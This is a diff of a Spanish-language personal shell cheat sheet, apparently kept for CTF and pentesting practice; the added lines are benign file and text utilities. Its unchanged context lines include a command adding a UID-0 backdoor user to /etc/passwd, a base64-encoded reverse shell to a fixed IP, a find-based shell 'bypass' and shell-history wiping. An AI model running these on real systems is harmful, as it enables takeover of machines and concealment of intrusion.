@@ -25,6 +25,8 @@ cat file | tr '[A-Z]' '[a-z]' # convierte Mayusculas por Minusculas
 cat file | grep ::: | awk -F: '{print $1":"$4}'
 cat file | xclip -sel clip # copia el contenido del archivo en el portapapeles
 cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
+cat /etc/passwd | awk 'NR==17'
+pwdx --> chequear path de un PID
 
 # xclip
 xclip -out -sel clip > file
@@ -42,6 +44,8 @@ find / -type f -name 'user.txt' -exec cat {} \; 2>/dev/null
 find /usr/bin/python3 -exec {} -c 'rev-shell' # bypassing
 find thm/ -type f -iname 'notas'| xargs -i scp -o 'ProxyJump pgraffigna@192.168.122.1' '{}' quentin@192.168.0.20:
 find . -type f -iname 'notas' -exec cat {} \; > total_notes.txt
+find . ! -name 'notas.txt' -type f -exec rm -f {} +
+find . -empty -type d -delete
 
 # mount
 mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
@@ -87,7 +91,7 @@ awk '{print "https://"$1}'
 awk '{print $1 ":" $2}'
 awk '{print $1}' FS=':' # FS=delimitador
 
-#echo
+# echo
 echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd # crear un usuario 'root2' con el PASSWORD creado
 echo !:2-3 # rango de argumentos
 echo !? # estado de salida del último comando
@@ -97,6 +101,7 @@ echo !* # todos los argumentos
 echo "testing%3Fcmd%3Dwhoami" | php -R 'echo urldecode($argn);'
 echo /dev/null > ~/.zsh_history #borrar el historial zsh
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNS4yMDcvODAwMCAwPiYxCg | bash | base64 -d | bash #base64 rev-shell encoding
+echo " [√]"
 
 # grep
 grep -oP '\[.*?\]' # quita los corchetes
@@ -140,6 +145,10 @@ intitle: index.of #open directory listing
 sudo apt install -y spice-vdagent && spice-vdagent # spice qemu copy-paste (aplicar en la VM)
 remote-viewer spice://localhost:5900 -f & disown
 virt-viewer --connect qemu:///system --wait kali64-OS &>/dev/null & disown # levanta el proceso + oculta el output + disocia el proceso de la terminal
+
+# varios
+apt list --installed > instalados.txt
+diff old.txt new.txt | grep ">"|cut -c 3- > diff.txt
 
 dpkg -i DEB &>/dev/null # esconde output + error 
 dpkg-deb -xv file.deb file.out # descomprime el deb
